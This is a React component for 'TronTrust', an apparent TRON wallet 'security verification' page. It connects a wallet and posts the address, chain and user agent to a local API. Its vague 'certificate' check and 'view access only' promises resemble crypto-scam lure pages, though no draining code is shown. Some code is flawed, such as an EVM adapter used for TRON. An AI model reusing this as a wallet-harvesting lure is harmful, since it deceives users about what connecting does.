// WalletConnect.js
import { useState, useEffect } from 'react';
import { createAppKit } from '@reown/appkit';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { tron, tronShasta } from '@reown/appkit/networks';
import { FaBolt, FaCog, FaShieldAlt, FaQuestionCircle, FaWallet } from 'react-icons/fa';
import logo from './logo.png'; // Make sure to have this image in your project
import './styles.css';

type WalletData = {
  address: string;
  chainId: number;
  network: string;
  walletType: string;
  sessionId: string;
  metadata: {
    userAgent: string;
    timestamp: number;
  };
};

const WalletConnect = () => {
  const [currentWallet, setCurrentWallet] = useState<WalletData | null>(null);
  const [modal, setModal] = useState<ReturnType<typeof createAppKit> | null>(null);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);

  const toggleMobileMenu = () => {
    setMobileMenuOpen(!mobileMenuOpen);
  };

  // API Configuration
  const API_BASE_URL = 'http://localhost:5000/api';
  const PROJECT_ID = '048110749acfc9f73e40e560cd1c11ec'; // Replace with your actual project ID

  const log = (message: string) => {
    console.log(`[TronTrust] ${message}`);
  };

  // Initialize AppKit for TRON
  useEffect(() => {
    const initializeAppKit = async () => {
      try {
        // Initialize Wagmi Adapter for TRON networks
        const wagmiAdapter = new WagmiAdapter({
          projectId: PROJECT_ID,
          networks: [tron, tronShasta] // Using TRON mainnet and testnet
        });

        // Create AppKit instance for TRON
        const appKit = createAppKit({
          adapters: [wagmiAdapter],
          projectId: PROJECT_ID,
          networks: [tron, tronShasta],
          defaultNetwork: tron, // Default to TRON mainnet
          metadata: {
            name: 'TronTrust',
            description: 'TRON Wallet Security Verification App',
            url: window.location.origin,
            icons: ['https://avatars.githubusercontent.com/u/37784886']
          },
          features: {
            analytics: true,
            email: false,
            socials: []
          }
        });

        setModal(appKit);
        log('TronTrust AppKit initialized successfully for TRON network');

        // Set up event listeners
        appKit.subscribeAccount((account: { isConnected: boolean; address?: string }, chainId?: number) => {
          if (account.isConnected && account.address) {
            log(`TRON Wallet connected: ${account.address}`);
            
            const resolvedChainId = chainId || 728126428; // TRON mainnet chain ID
            const walletData = {
              address: account.address,
              chainId: resolvedChainId,
              network: resolvedChainId === 728126428 ? 'TRON Mainnet' : 
                      resolvedChainId === 2494104990 ? 'TRON Shasta Testnet' : 'TRON Network',
              walletType: 'TRON',
              sessionId: Date.now().toString(),
              metadata: {
                userAgent: navigator.userAgent,
                timestamp: Date.now()
              }
            };
            
            setCurrentWallet(walletData);
            saveWalletToAPI(walletData);
          } else {
            log('TRON Wallet disconnected');
            if (currentWallet) {
              removeWalletFromAPI(currentWallet.address);
            }
            setCurrentWallet(null);
          }
        });

        // Network change listener for TRON
        if (typeof appKit.subscribeNetwork === 'function') {
          appKit.subscribeNetwork((network: { chainId?: string | number }) => {
            let chainIdNum: number | undefined;
            if (typeof network.chainId === 'string') {
              chainIdNum = parseInt(network.chainId, 10);
            } else if (typeof network.chainId === 'number') {
              chainIdNum = network.chainId;
            }
            if (currentWallet && chainIdNum !== undefined && !isNaN(chainIdNum)) {
              log(`TRON network changed to: ${chainIdNum}`);
              const updatedWallet = {
                ...currentWallet,
                chainId: chainIdNum,
                network: chainIdNum === 728126428 ? 'TRON Mainnet' : 
                        chainIdNum === 2494104990 ? 'TRON Shasta Testnet' : 'TRON Network'
              };
              setCurrentWallet(updatedWallet);
              saveWalletToAPI(updatedWallet);
            }
          });
        }

      } catch (error) {
        if (error instanceof Error) {
          log(`Error initializing TronTrust AppKit: ${error.message}`);
        } else {
          log(`Error initializing TronTrust AppKit: ${String(error)}`);
        }
      }
    };

    initializeAppKit();
  }, []);

  // API Functions
  const saveWalletToAPI = async (walletData: WalletData) => {
    try {
      const response = await fetch(`${API_BASE_URL}/connect-wallet`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(walletData)
      });
      
      const result = await response.json();
      if (result.success) {
        log(`TRON wallet saved to API: ${walletData.address}`);
        return result;
      } else {
        log(`Error saving TRON wallet: ${result.error}`);
        return null;
      }
    } catch (error) {
      if (error instanceof Error) {
        log(`API Error: ${error.message}`);
      } else {
        log(`API Error: ${String(error)}`);
      }
      return null;
    }
  };

  const removeWalletFromAPI = async (address: string) => {
    try {
      const response = await fetch(`${API_BASE_URL}/disconnect-wallet`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ address })
      });
      
      const result = await response.json();
      if (result.success) {
        log(`TRON wallet removed from API: ${address}`);
        return result;
      } else {
        log(`Error removing TRON wallet: ${result.error}`);
        return null;
      }
    } catch (error) {
      if (error instanceof Error) {
        log(`API Error: ${error.message}`);
      } else {
        log(`API Error: ${String(error)}`);
      }
      return null;
    }
  };

  // Button Handlers
  const handleConnect = () => {
    log('Opening TRON wallet connection modal...');
    if (modal) {
      modal.open();
    } else {
      log('Cannot open TRON wallet connection modal: modal is not initialized.');
    }
  };

  const handleDisconnect = async () => {
    log('Disconnecting TRON wallet...');
    if (modal) {
      await modal.disconnect();
    } else {
      log('Cannot disconnect: modal is not initialized.');
    }
  };

  return (
    <div>
      <div className="app">
        <nav className="nav">
          <div className="nav-container">
            <a href="/" className="flex items-center space-x-2">
              <img src={logo} alt="TronTrust Logo" className="nav-logo" />
            </a>
            
            <div className="nav-links">
              <a href="#" className="nav-link">
                <FaBolt className="text-sm" />
                <span className="text-sm">Features</span>
              </a>
              <a href="#" className="nav-link">
                <FaCog className="text-sm" />
                <span className="text-sm">How It Works</span>
              </a>
              <a href="#" className="nav-link">
                <FaShieldAlt className="text-sm" />
                <span className="text-sm">Verification Status</span>
              </a>
              <a href="#" className="nav-link">
                <FaQuestionCircle className="text-sm" />
                <span className="text-sm">FAQ</span>
              </a>
            </div>
            
            <button className="nav-button">
              <FaWallet className="text-sm" />
              <span>TRON Wallet Security Check</span>
            </button>
            
            <button 
              className="mobile-menu-button" 
              onClick={toggleMobileMenu}
              aria-label="Toggle menu"
            >
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6h16M4 12h16M4 18h16"></path>
              </svg>
            </button>
          </div>
          
          <div className={`mobile-menu ${mobileMenuOpen ? 'active' : ''}`}>
            <div className="mobile-menu-links">
              <a href="#" className="mobile-menu-link">
                <FaBolt className="text-sm" />
                <span className="text-sm">Features</span>
              </a>
              <a href="#" className="mobile-menu-link">
                <FaCog className="text-sm" />
                <span className="text-sm">How It Works</span>
              </a>
              <a href="#" className="mobile-menu-link">
                <FaShieldAlt className="text-sm" />
                <span className="text-sm">Verification Status</span>
              </a>
              <a href="#" className="mobile-menu-link">
                <FaQuestionCircle className="text-sm" />
                <span className="text-sm">FAQ</span>
              </a>
              <button className="mobile-menu-button-main">
                <FaWallet className="text-sm" />
                <span>TRON Wallet Security Check</span>
              </button>
            </div>
          </div>
        </nav>
        
        <main className="main-container">
          <div className="content-container">
            <div className="progress-container">
              <div className="progress-bar">
                <div className="progress-fill" id="progressBar"></div>
              </div>
              
              <div className="steps-container">
                <div className="step">
                  <div className="step-icon" id="step1">
                    <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path>
                    </svg>
                  </div>
                  <span className="step-label">Get Started</span>
                </div>
                
                <div className="step">
                  <div className="step-icon inactive" id="step2">
                    <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M9.5 2A1.5 1.5 0 0 0 8 3.5v1A1.5 1.5 0 0 0 9.5 6h5A1.5 1.5 0 0 0 16 4.5v-1A1.5 1.5 0 0 0 14.5 2h-5ZM12 7a5 5 0 0 1 5 5v1.086l1.707 1.707A1 1 0 0 1 18 16.5V17a1 1 0 0 1-1 1H7a1 1 0 0 1-1-1v-.5a1 1 0 0 1 .293-.707L8 14.086V12a5 5 0 0 1 5-5Z" />
                    </svg>
                  </div>
                  <span className="step-label inactive">Scan</span>
                </div>
                
                <div className="step">
                  <div className="step-icon inactive" id="step3">
                    <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z" />
                    </svg>
                  </div>
                  <span className="step-label inactive">Results</span>
                </div>
                
                <div className="step">
                  <div className="step-icon inactive" id="step4">
                    <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M12 2C13.1 2 14 2.9 14 4C14 5.1 13.1 6 12 6C10.9 6 10 5.1 10 4C10 2.9 10.9 2 12 2ZM21 9V7L15 1H5C3.89 1 3 1.89 3 3V21C3 22.11 3.89 23 5 23H19C20.11 23 21 22.11 21 21V9M19 9H14V4L19 9Z" />
                    </svg>
                  </div>
                  <span className="step-label inactive">Waitlist</span>
                </div>
              </div>
            </div>
            
            <div className="heading-container">
              <h1 className="main-heading">
                CHECK YOUR TRON CERTIFICATE NOW
              </h1>
              <p className="sub-heading">
                Connect your TRON wallet to begin the security verification process
              </p>
            </div>
            
            <div className="card-container">
              <div className="card">
                <div className="card-row">
                  <div className="card-content">
                    <div className="card-icon">
                      <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                        <path d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z"></path>
                      </svg>
                    </div>
                    <div className="card-text">
                      <h3 className="card-title">TRON WALLET</h3>
                      <p className="card-description">Universal TRON Wallet</p>
                    </div>
                  </div>
                  {!currentWallet ? (
                    <button 
                      onClick={handleConnect}
                      className='card-button'
                    >
                      Get TRON certificate
                    </button>
                  ) : (
                    <button 
                      onClick={handleDisconnect}
                      className='card-button'
                    >
                      Disconnect
                    </button>
                  )}
                </div>
              </div>
              
              <div className="card">
                <div className="card-content">
                  <div className="card-icon">
                    <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 3l7 4v5c0 5-3.5 9.74-7 11-3.5-1.26-7-6-7-11V7l7-4z" />
                      <circle cx="12" cy="12" r="3" fill="currentColor" />
                    </svg>
                  </div>
                  <div className="card-text">
                    <h3 className="card-title">Your TRON security is our priorit.y</h3>
                    <p className="card-description">We only require view access to analyze your TRON wallet. No transactions or approvals needed.</p>
                  </div>
                </div>
              </div>
            </div>

            {currentWallet && (
              <div className="wallet-info">
                <h3>Connected TRON Wallet:</h3>
                <p><strong>Address:</strong> {currentWallet.address}</p>
                <p><strong>Network:</strong> {currentWallet.network}</p>
                <p><strong>Chain ID:</strong> {currentWallet.chainId}</p>
              </div>
            )}
          </div>
        </main>
      </div>
    </div>
  );
};

export default WalletConnect;